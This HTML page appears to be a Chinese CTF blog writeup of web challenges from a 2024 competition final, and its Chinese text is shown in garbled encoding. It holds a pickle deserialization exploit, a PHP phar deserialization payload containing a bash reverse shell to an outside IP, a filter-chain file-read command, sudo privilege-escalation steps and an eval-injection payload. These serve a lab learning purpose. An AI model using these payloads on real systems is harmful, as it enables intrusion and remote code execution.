<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>å›½åŸæ¯å†³èµ›-Web-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, web">
<meta name="description" content="CTF
mountain

Python Bottleæ¡†æ¶ä¼ªé€ sessionæ‰“pickleååºåˆ—åŒ–
æ‹¿åˆ°é¢˜ç›®çœ‹ä¸€ä¸‹æºç ï¼Œæœ‰hint

è®¿é—®/display

æ ¹æ®æç¤ºï¼Œå°è¯•ç”¨photoå‚æ•°è¯»å›¾ç‰‡">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/%E5%9B%BD%E5%9F%8E%E6%9D%AF_2024%E5%86%B3%E8%B5%9B/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.da3d1fce642585ca4a88e6246f264be963280e57889197b482bc138b96068178.css" integrity="sha256-2j0fzmQlhcpKiOYkbyZL6WMoDleIkZe0grwTi5YGgXg=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/%E5%9B%BD%E5%9F%8E%E6%9D%AF_2024%E5%86%B3%E8%B5%9B/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/%E5%9B%BD%E5%9F%8E%E6%9D%AF_2024%E5%86%B3%E8%B5%9B/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="å›½åŸæ¯å†³èµ›-Web-Writeup">
  <meta property="og:description" content="CTF mountain Python Bottleæ¡†æ¶ä¼ªé€ sessionæ‰“pickleååºåˆ—åŒ–
æ‹¿åˆ°é¢˜ç›®çœ‹ä¸€ä¸‹æºç ï¼Œæœ‰hint
è®¿é—®/display
æ ¹æ®æç¤ºï¼Œå°è¯•ç”¨photoå‚æ•°è¯»å›¾ç‰‡">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2024-12-27T22:03:55+08:00">
    <meta property="article:modified_time" content="2024-12-27T22:03:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="å›½åŸæ¯å†³èµ›-Web-Writeup">
<meta name="twitter:description" content="CTF
mountain

Python Bottleæ¡†æ¶ä¼ªé€ sessionæ‰“pickleååºåˆ—åŒ–
æ‹¿åˆ°é¢˜ç›®çœ‹ä¸€ä¸‹æºç ï¼Œæœ‰hint

è®¿é—®/display

æ ¹æ®æç¤ºï¼Œå°è¯•ç”¨photoå‚æ•°è¯»å›¾ç‰‡">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "å›½åŸæ¯å†³èµ›-Web-Writeup",
      "item": "http://localhost:1313/post/%E5%9B%BD%E5%9F%8E%E6%9D%AF_2024%E5%86%B3%E8%B5%9B/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "å›½åŸæ¯å†³èµ›-Web-Writeup",
  "name": "å›½åŸæ¯å†³èµ›-Web-Writeup",
  "description": "CTF mountain Python Bottleæ¡†æ¶ä¼ªé€ sessionæ‰“pickleååºåˆ—åŒ–\næ‹¿åˆ°é¢˜ç›®çœ‹ä¸€ä¸‹æºç ï¼Œæœ‰hint\nè®¿é—®/display\næ ¹æ®æç¤ºï¼Œå°è¯•ç”¨photoå‚æ•°è¯»å›¾ç‰‡\n",
  "keywords": [
    "writeup", "ctf", "web"
  ],
  "articleBody": "CTF mountain Python Bottleæ¡†æ¶ä¼ªé€ sessionæ‰“pickleååºåˆ—åŒ–\næ‹¿åˆ°é¢˜ç›®çœ‹ä¸€ä¸‹æºç ï¼Œæœ‰hint\nè®¿é—®/display\næ ¹æ®æç¤ºï¼Œå°è¯•ç”¨photoå‚æ•°è¯»å›¾ç‰‡\nçŒœæµ‹åº”è¯¥æœ‰ä»»æ„æ–‡ä»¶è¯»å–\nè¯»ä¸€ä¸‹/etc/passwd\næ¥ä¸‹æ¥çœ‹çœ‹èƒ½ä¸èƒ½è¯»æºç \nå…ˆè¯»ç¯å¢ƒå˜é‡/proc/self/cmdlineï¼Œå‘ç°è¢«wafäº†\nå†è¯•è¯•ç›´æ¥è¯»/proc/1/cmdlineï¼ˆselfè¢«wafäº†ï¼‰\nå¾—åˆ°æºç ä½ç½®ï¼Œæˆ‘ä»¬ç›´æ¥è¯»\n/apppppp/app.py\næ‹¿åˆ°æºç \n1from bottle import Bottle, route, run, template, request, response 2from config.D0g3_GC import Mountain 3import os 4import re 5 6 7messages = [] 8 9@route(\"/\") 10def home(): 11 return template(\"index\") 12 13 14@route(\"/hello\") 15def hello_world(): 16 try: 17 session = request.get_cookie(\"name\", secret=Mountain) 18 if not session or session[\"name\"] == \"guest\": 19 session = {\"name\": \"guest\"} 20 response.set_cookie(\"name\", session, secret=Mountain) 21 return template(\"guest\", name=session[\"name\"]) 22 if session[\"name\"] == \"admin\": 23 return template(\"admin\", name=session[\"name\"]) 24 except: 25 return \"hacker!!! I've caught you\" 26 27 28@route(\"/display\") 29def get_image(): 30 photo = request.query.get('photo') 31 if photo is None: 32 return template('display') 33 if re.search(\"^../|environ|self\", photo): 34 return \"Hacker!!! I'll catch you no matter what you do!!!\" 35 requested_path = os.path.join(os.getcwd(), \"picture\", photo) 36 try: 37 if photo.endswith('.png'): 38 default_png_path = \"/appppp/picture/\" 39 pngrequested_path = default_png_path+photo 40 with open(pngrequested_path, 'rb') as f: 41 tfile = f.read() 42 response.content_type = 'image/png' 43 else: 44 with open(requested_path) as f: 45 tfile = f.read() 46 except Exception as e: 47 return \"you have some errors, continue to try again\" 48 return tfile 49 50 51@route(\"/admin\") 52def admin(): 53 session = request.get_cookie(\"name\", secret=Mountain) 54 if session and session[\"name\"] == \"admin\": 55 return template(\"administator\", messages=messages) 56 else: 57 return \"No permission!!!!\" 58 59 60 61 62if __name__ == \"__main__\": 63 os.chdir(os.path.dirname(__file__)) 64 run(host=\"0.0.0.0\", port=8089) è¿™é‡Œæ˜¯å¯¼å…¥çš„æ˜¯æ„é€ cookieçš„key\nfrom config.D0g3_GC import Mountain keyå¯ä»¥é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–è¯»åˆ°\n/appppp/config/D0g3_GC.py\né€šè¿‡ä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå“ªæ€•æˆ‘ä»¬æ„é€ å‡ºadminè¿›å…¥åˆ°/adminè·¯ç”±é‚£æˆ‘ä»¬å…¶å®ä¹Ÿä¸èƒ½å¾—åˆ°ä»€ä¹ˆ\näº‹å®ä¸Šè¿™æ˜¯ä¸€é“pickleååºåˆ—åŒ–çš„é¢˜ç›®\næˆ‘ä»¬å¦‚æœè·Ÿè¿›get_cookieæ–¹æ³•(/adminå’Œ/helloéƒ½æœ‰)æˆ‘ä»¬å¯ä»¥å‘ç°\nåœ¨è¿™ä¸ªget_cookieæ–¹æ³•é‡Œé¢ä¼šå¯¹cookieä¸­çš„æ•°æ®è¿›è¡Œpickleååºåˆ—åŒ–\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»–å°±å¯ä»¥è¿›è¡Œä»»ä½•å‘½ä»¤çš„æ‰§è¡Œ\nexp\n1from bottle import route, run,response 2import os 3 4 5Mountain = \"123\" 6 7class exp(object): 8 def __reduce__(self): 9 return (eval, (\"__import__('os').popen('calc').read()\",)) 10 11 12@route(\"/\") 13def index(): 14 session = exp() 15 response.set_cookie(\"name\", session, secret=Mountain) 16 return \"success\" 17 18 19if __name__ == \"__main__\": 20 os.chdir(os.path.dirname(__file__)) 21 run(host=\"127.0.0.1\", port=8081) å¼¹shellæ‹¿flag\nå›¾ç‰‡æŸ¥çœ‹å™¨ è€ƒç‚¹ï¼š1.ä¿¡æ¯æ”¶é›† 2.filterchainè¯»æ–‡ä»¶ 3.pharååºåˆ—åŒ– 4.ææƒ\næ‹¿åˆ°é¢˜ç›®æ˜¯ä¸€ä¸ªåå­—è¾“å…¥å™¨ï¼Œä½†è¿™ç©æ„æ²¡ä»€ä¹ˆç”¨\néšä¾¿è¾“ä¸€ä¸ªåå­—å°±ä¼šè¿›å…¥åˆ°/trans1t.php\næˆ‘ä»¬å…ˆä¸æ€¥ç€å»æŒ‘æˆ˜ï¼Œå…ˆçœ‹çœ‹è¿™ä¸ªé¡µé¢æœ‰æ²¡æœ‰ä»€ä¹ˆhint\næç¤ºæœ‰ä¸œè¥¿åœ¨hI3t.php,ä½†æ˜¯æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥è®¿é—®\næ¥ç€ç‚¹æ¥åˆ°æŒ‘æˆ˜æ¥åˆ°/chal13nge.php\næ˜¯ä¸€ä¸ªå›¾ç‰‡ä¸Šä¼ ï¼Œæˆ‘ä»¬å†æŸ¥çœ‹ä¸€ä¸‹æºä»£ç \nç»“åˆåˆšåˆšçœ‹åˆ°çš„hI3t.phpï¼ŒçŒœæµ‹å¤§æ¦‚ç‡æ˜¯è¦æƒ³åŠæ³•è¯»hI3t.php\nå†çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œå†ä¸Šä¼ æˆåŠŸåå¯ä»¥è¿›è¡Œæ–‡ä»¶ä¿¡æ¯çš„æŸ¥è¯¢ï¼Œæ–‡ä»¶ä¿¡æ¯æŸ¥è¯¢ä½¿ç”¨çš„æ–¹æ³•å¾ˆå¯èƒ½å­˜åœ¨filteré“¾çš„æ¼æ´\nè¿™é‡Œæ˜¯å…³äºoracleçš„æ–‡ä»¶è¯»å–æ¼æ´\nPHP Filteré“¾â€”â€”åŸºäºoracleçš„æ–‡ä»¶è¯»å–æ”»å‡» - å…ˆçŸ¥ç¤¾åŒº\nè‡ªåŠ¨åŒ–å·¥å…·ï¼šhttps://github.com/synacktiv/php_filter_chains_oracle_exploit\npython filters_chain_oracle_exploit.py --target http://125.70.243.22:31345/chal13nge.php --file '/var/www/html/hI3t.php' --parameter image_path\r//--target ç›®æ ‡åœ°å€ --file è¦è¯»çš„æ–‡ä»¶åœ°å€ --parameter è¦æ³¨å…¥çš„å‚æ•° '\nè®¿é—®/x@1.php\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªåé—¨ç±»backdoorï¼Œé€šè¿‡å®ƒæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»»æ„çš„å‘½ä»¤\né‚£æˆ‘ä»¬æ€ä¹ˆè°ƒç”¨è¿™ä¸ªåé—¨ç±»å‘¢ï¼Ÿ\nç»“åˆåˆšåˆšçš„æ–‡ä»¶ä¸Šä¼ å’Œæ–‡ä»¶ä¿¡æ¯æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°pharååºåˆ—åŒ–\n1\u003c?php 2 3class backdoor 4{ 5 public $cmd; 6 7 function __destruct() 8 { 9 $cmd = $this-\u003ecmd; 10 system($cmd); 11 } 12} 13 14$a=new backdoor(); 15$a-\u003ecmd='bash -i \u003e\u0026 /dev/tcp/106.55.168.231/7777 0\u003e\u00261\"'; //å¼¹ä¸ªshell 16$phar = new Phar(\"test.phar\"); 17$phar-\u003estartBuffering(); 18$phar-\u003esetStub(\"\"); 19$phar-\u003esetMetadata($a); 20$phar-\u003eaddFromString(\"test.txt\", \"test\"); 21$phar-\u003estopBuffering(); æ¥ç€æˆ‘ä»¬å¯é€šè¿‡æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€çš„æ–¹æ³•ä¸Šä¼ æˆ‘ä»¬çš„pharæ–‡ä»¶\nä¸Šä¼ æˆåŠŸ\næˆ‘ä»¬æ¥ç€è¯»pharæ–‡ä»¶\næˆåŠŸå¼¹shell\nå°è¯•è¯»flagå‘ç°è¦ææƒ\né€šè¿‡ sudo -l å¯ä»¥å‘ç°æœ‰ä¸€ä¸ªcheck.shæ–‡ä»¶å…·æœ‰sudoæƒé™\næ‰§è¡Œcheck.shä¼šè¿è¡Œrun.sh\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡å†™ä¸€ä¸ªrun.shæ¥è¯»flag\necho \"cat /root/flag\" \u003e /tmp/rootscripts/run.sh\rchmod 777 /tmp/rootscripts/run.sh\rsudo /tmp/rootscripts/check.sh \"/tmp/rootscripts\" æ‹¿åˆ°flag\né¢˜å¤–\n/chal13nge.phpçš„æºç \n1\u003c?php 2error_reporting(0); 3include \"class.php\"; 4 5if (isset($_POST['image_path'])) { 6 $image_path = $_POST['image_path']; 7 echo \"The owner ID of the file is: \"; 8 echo fileowner($image_path).\"\n\"; 9 echo \"æ–‡ä»¶ä¿¡æ¯å¦‚ä¸‹ï¼š\". \"\n\"; 10 $m = getimagesize($image_path); 11 if ($m) { 12 echo \"å®½åº¦: \" . $m[0] . \" åƒç´ \n\"; 13 echo \"é«˜åº¦: \" . $m[1] . \" åƒç´ \n\"; 14 echo \"ç±»å‹: \" . $m[2] . \"\n\"; 15 echo \"HTML å±æ€§: \" . $m[3] . \"\n\"; 16 echo \"MIME ç±»å‹: \" . $m['mime'] . \"\n\"; 17 } else { 18 echo \"æ— æ³•è·å–å›¾åƒä¿¡æ¯ï¼Œè¯·ç¡®ä¿æ–‡ä»¶ä¸ºæœ‰æ•ˆçš„å›¾åƒæ ¼å¼ã€‚\"; 19 } 20} 21 22$allowed_extensions = ['jpg', 'jpeg', 'gif', 'png']; 23$upload_dir = __DIR__ . '/uploads/'; 24if ($_SERVER['REQUEST_METHOD'] == 'POST' \u0026\u0026 isset($_FILES['image'])) { 25 $file = $_FILES['image']; 26 $file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); 27 28 if (in_array($file_ext, $allowed_extensions)) { 29 $upload_path = $upload_dir . basename($file['name']); 30 31 if (move_uploaded_file($file['tmp_name'], $upload_path)) { 32 echo \"ä¸Šä¼ æˆåŠŸï¼è·¯å¾„: \" . 'uploads/' . basename($file['name']); 33 } else { 34 echo \"æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œè¯·é‡è¯•ã€‚\"; 35 } 36 } else { 37 echo \"ä¸æ”¯æŒçš„æ–‡ä»¶ç±»å‹ï¼Œä»…æ”¯æŒ: \" . implode(\", \", $allowed_extensions); 38 } 39} 40?\u003e 41\u003c!DOCTYPE html\u003e 42 43 44 45 å›¾ç‰‡ä¸Šä¼ ä¸ä¿¡æ¯è·å– 46 47 48å›¾ç‰‡ä¸Šä¼  49 50 51 ä¸Šä¼ å›¾ç‰‡ 52 53è·å–å›¾ç‰‡ä¿¡æ¯ 54 55 è¯·è¾“å…¥å›¾ç‰‡è·¯å¾„ï¼š 56 57 è·å–å›¾ç‰‡ä¿¡æ¯ 58 59 60 ä»æºç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…³äºç…§ç‰‡çš„ä¿¡æ¯æŸ¥è¯¢ä½¿ç”¨çš„æ˜¯getimagesizeå‡½æ•°ï¼Œè€Œä¸”æ²¡æœ‰å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤\nè€Œgetimagesizeä¹Ÿæ˜¯å—filteré“¾å½±å“çš„å‡½æ•°ä¹‹ä¸€\nAWDP Chemical_Plant æ”»å‡» FeedbackService.php\n1\u003c?php 2error_reporting(0); 3class FeedbackService { 4 private $db; 5 6 public function __construct($dbConnection) { 7 $this-\u003edb = $dbConnection; 8 } 9 10 public function addFeedbackByUserId($user_id, $feedback) { 11 // é¢„å¤„ç† 12 $stmt = $this-\u003edb-\u003eprepare(\"INSERT INTO feedback (userid, feedback) VALUES (?, ?)\"); 13 $stmt-\u003ebind_param(\"ss\", $user_id, $feedback); 14 15 // æ‰§è¡Œæ’å…¥æ“ä½œ 16 if ($stmt-\u003eexecute()) { 17 return true; 18 } else { 19 return false; 20 } 21 } 22 23 public function getEmailById($id) { 24 // é¢„å¤„ç† 25 $stmt = $this-\u003edb-\u003eprepare(\"SELECT userid FROM feedback WHERE id = ?\"); 26 $stmt-\u003ebind_param(\"i\", $id); 27 // æ‰§è¡ŒæŸ¥æ‰¾æ“ä½œ 28 if ($stmt-\u003eexecute()) { 29 $result = $stmt-\u003eget_result(); 30 if ($result-\u003enum_rows \u003e 0) { 31 $row = $result-\u003efetch_assoc(); 32 $arr = stripslashes($row['userid']); 33 eval('$arr='.$arr.';'); 34 return $arr; 35 } else { 36 return null; 37 } 38 } else { 39 return false; 40 } 41 } 42} 43 44?\u003e åœ¨FeedbackService.phpçš„getEmailByIdæ–¹æ³•ä¸­çš„å­˜åœ¨evalï¼Œå‡å¦‚arrå¯æ§ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ\né‚£æˆ‘ä»¬ç»§ç»­å¾€ä¸Šçœ‹\n$arr = stripslashes($row['userid']); å˜é‡arræ¥æºäºæ•°æ®åº“æŸ¥è¡¨idè¿”å›çš„ç»“æœä¸­çš„userid\nå‡å¦‚è¯´æˆ‘ä»¬å¯ä»¥æå‰åœ¨useridä¸­å†™å…¥æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå†é€šè¿‡idæŸ¥è¯¢ï¼Œå°±å¯ä»¥è¿›è¡Œä»»æ„å‘½ä»¤çš„æ‰§è¡Œ\nå†™å…¥æ•°æ®åº“çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥åœ¨FeedbackService.phpçš„addFeedbackByUserIdæ–¹æ³•ä¸­æ‰¾åˆ°\npublic function addFeedbackByUserId($user_id, $feedback) {\r// é¢„å¤„ç†\r$stmt = $this-\u003edb-\u003eprepare(\"INSERT INTO feedback (userid, feedback) VALUES (?, ?)\");\r$stmt-\u003ebind_param(\"ss\", $user_id, $feedback);\r// æ‰§è¡Œæ’å…¥æ“ä½œ\rif ($stmt-\u003eexecute()) {\rreturn true;\r} else {\rreturn false;\r}\r} è¿™é‡Œé€šè¿‡è´«æ‹¼æ¥çš„æ–¹å¼å°†user_idæ‹¼æ¥åˆ°sqlè¯­å¥ä¸­å¹¶æ‰§è¡Œ\né‚£æˆ‘ä»¬æ¥ä¸‹å°±éœ€è¦æ‰¾åˆ°å“ªé‡Œè°ƒç”¨addFeedbackByUserIdæ–¹æ³•\nåœ¨services.phpé‡Œè¿›è¡Œç”¨æˆ·åé¦ˆå†…å®¹æäº¤æ—¶ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤å°±è°ƒç”¨addFeedbackByUserIdæ–¹æ³•å†™å…¥\né‚£æˆ‘ä»¬æ‰§è¡Œä¸ªwhoamiè¯•è¯•\nå‘½ä»¤ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™å‘¢\neval('$arr='.$arr.';'); å› ä¸ºå‘½ä»¤æ‰§è¡Œçš„æ—¶å€™è¿›è¡Œäº†ç®€å•çš„æ‹¼æ¥\nå†™å…¥æ•°æ®åæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦çœ‹çœ‹æ€æ ·è°ƒç”¨getEmailByIdæ–¹æ³•è¿›è¡Œæ•°æ®åº“idæŸ¥è¯¢\ncontroller.php\n1\u003c?php 2 3// å¼•å…¥ç±»æ–‡ä»¶ 4require_once 'NewsService.php'; 5require_once 'FeedbackService.php'; 6require_once'dbconnect.php'; 7require_once 'news_data.php'; 8 9$db = new DBConnect(); 10$connection = $db-\u003egetConnection(); 11$NewsService = new NewsService($news_items); 12$FeedbackService = new FeedbackService($connection); 13 14$className = isset($_GET['c']) ? $_GET['c'] : null; 15$methodName = isset($_GET['m']) ? $_GET['m'] : null; 16$id = isset($_GET['id']) ? $_GET['id'] : null; 17 18 19if ($className \u0026\u0026 $methodName) { 20 if ($className === 'NewsService' \u0026\u0026 method_exists($NewsService, $methodName)) 21 { 22 echo $NewsService-\u003e$methodName($id); 23 } 24 elseif ($className === 'FeedbackService' \u0026\u0026 method_exists($FeedbackService, $methodName)) 25 { 26 echo $FeedbackService-\u003e$methodName($id); 27 } else { 28 echo \"æ— æ•ˆçš„ç±»æˆ–æ–¹æ³•\"; 29 } 30} else { 31 echo \"ç¼ºå°‘ç±»æˆ–æ–¹æ³•å‚æ•°\"; 32} 33 34 35?\u003e åœ¨controller.phpé‡Œé¢å¯ä»¥é€šè°ƒç”¨FeedbackService.phpå’ŒNewsService.phpä¸­çš„æ–¹æ³•\n$className = isset($_GET['c']) ? $_GET['c'] : null;\r$methodName = isset($_GET['m']) ? $_GET['m'] : null;\r$id = isset($_GET['id']) ? $_GET['id'] : null; é€šè¿‡getä¼ å‚å³å¯è°ƒç”¨getEmailByIdæ–¹æ³•\npayload:\nc=FeedbackService\u0026m=getEmailById\u0026id=0 è¿™ä¸ªidæˆ‘ä»¬å…¶å®å¹¶ä¸æ¸…æ¥šï¼Œå¯ä»¥çˆ†ç ´æˆ–è€…ä¸€ä¸ªä¸ªè¯•è¯•ï¼Œåæ­£ä¸å¤š\nå‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œæ¥ä¸‹æ¥åªéœ€è¦è¯»flagå°±è¡Œäº†\n",
  "wordCount" : "3046",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2024-12-27T22:03:55+08:00",
  "dateModified": "2024-12-27T22:03:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/%E5%9B%BD%E5%9F%8E%E6%9D%AF_2024%E5%86%B3%E8%B5%9B/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>é¦–é¡µğŸ“”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£ğŸ—ƒï¸</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>æ ‡ç­¾ğŸ”–</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="æœç´¢">
                    <span>æœç´¢ğŸ”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="å‹é“¾ğŸˆ">
                    <span>å‹é“¾ğŸˆ</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="å…³äº">
                    <span>å…³äºğŸ‘¨â€ğŸ’»</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      å›½åŸæ¯å†³èµ›-Web-Writeup
    </h1>
<div class="post-meta"><span title='2024-12-27 22:03:55 +0800 CST'>2024-12-27</span>&nbsp;Â·&nbsp;7 åˆ†é’Ÿ&nbsp;Â·&nbsp;Xrntkk

<div class="meta-item">&nbspÂ·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">ç›®å½•</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#ctf" aria-label="CTF">CTF</a><ul>
                        
                <li>
                    <a href="#mountain" aria-label="mountain">mountain</a></li>
                <li>
                    <a href="#%e5%9b%be%e7%89%87%e6%9f%a5%e7%9c%8b%e5%99%a8" aria-label="å›¾ç‰‡æŸ¥çœ‹å™¨">å›¾ç‰‡æŸ¥çœ‹å™¨</a></li></ul>
                </li>
                <li>
                    <a href="#awdp" aria-label="AWDP">AWDP</a><ul>
                        
                <li>
                    <a href="#chemical_plant" aria-label="Chemical_Plant">Chemical_Plant</a><ul>
                        
                <li>
                    <a href="#%e6%94%bb%e5%87%bb" aria-label="æ”»å‡»">æ”»å‡»</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h3 id="ctf">CTF<a hidden class="anchor" aria-hidden="true" href="#ctf">#</a></h3>
<h4 id="mountain">mountain<a hidden class="anchor" aria-hidden="true" href="#mountain">#</a></h4>
<blockquote>
<p>Python Bottleæ¡†æ¶ä¼ªé€ sessionæ‰“pickleååºåˆ—åŒ–</p></blockquote>
<p>æ‹¿åˆ°é¢˜ç›®çœ‹ä¸€ä¸‹æºç ï¼Œæœ‰hint</p>
<p><img alt="image-20241226140358450" loading="lazy" src="../assets/image-20241226140358450.png"></p>
<p>è®¿é—®/display</p>
<p><img alt="image-20241226140433229" loading="lazy" src="../assets/image-20241226140433229.png"></p>
<p>æ ¹æ®æç¤ºï¼Œå°è¯•ç”¨photoå‚æ•°è¯»å›¾ç‰‡</p>
<p><img alt="image-20241226140546992" loading="lazy" src="../assets/image-20241226140546992.png"></p>
<p>çŒœæµ‹åº”è¯¥æœ‰ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>è¯»ä¸€ä¸‹/etc/passwd</p>
<p><img alt="image-20241226140653156" loading="lazy" src="../assets/image-20241226140653156.png"></p>
<p>æ¥ä¸‹æ¥çœ‹çœ‹èƒ½ä¸èƒ½è¯»æºç </p>
<p>å…ˆè¯»ç¯å¢ƒå˜é‡/proc/self/cmdlineï¼Œå‘ç°è¢«wafäº†</p>
<p><img alt="image-20241226140756345" loading="lazy" src="../assets/image-20241226140756345.png"></p>
<p>å†è¯•è¯•ç›´æ¥è¯»/proc/1/cmdlineï¼ˆselfè¢«wafäº†ï¼‰</p>
<p><img alt="image-20241226140930625" loading="lazy" src="../assets/image-20241226140930625.png"></p>
<p>å¾—åˆ°æºç ä½ç½®ï¼Œæˆ‘ä»¬ç›´æ¥è¯»</p>
<p>/apppppp/app.py</p>
<p><img alt="image-20241226141019460" loading="lazy" src="../assets/image-20241226141019460.png"></p>
<p>æ‹¿åˆ°æºç </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">Bottle</span><span class="p">,</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span>
